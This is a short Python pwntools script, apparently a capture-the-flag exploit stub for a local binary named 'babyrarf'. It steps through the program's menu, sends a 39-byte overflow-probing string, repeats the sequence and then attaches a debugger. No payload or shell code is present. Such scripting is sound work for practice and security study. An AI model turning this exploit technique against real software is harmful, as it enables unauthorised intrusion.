from pwn import *
io = process("./babyrarf")

for i in range(4):
    io.recvline()

io.sendline("aaaq")
for i in range(11):
    io.recvuntil("4. A cr0wn")
    io.recvline()
    io.recvline()
    io.sendline("1")

io.recvuntil("Congratulations")
io.recvline()
io.recvline()


io.sendline("a"*39)
for i in range(4):
    io.recvline()

io.sendline("aaaq")
for i in range(11):
    io.recvuntil("4. A cr0wn")
    io.recvline()
    io.recvline()
    io.sendline("1")

io.recvuntil("Congratulations")
io.recvline()
io.recvline()
gdb.attach(io)
io.interactive()
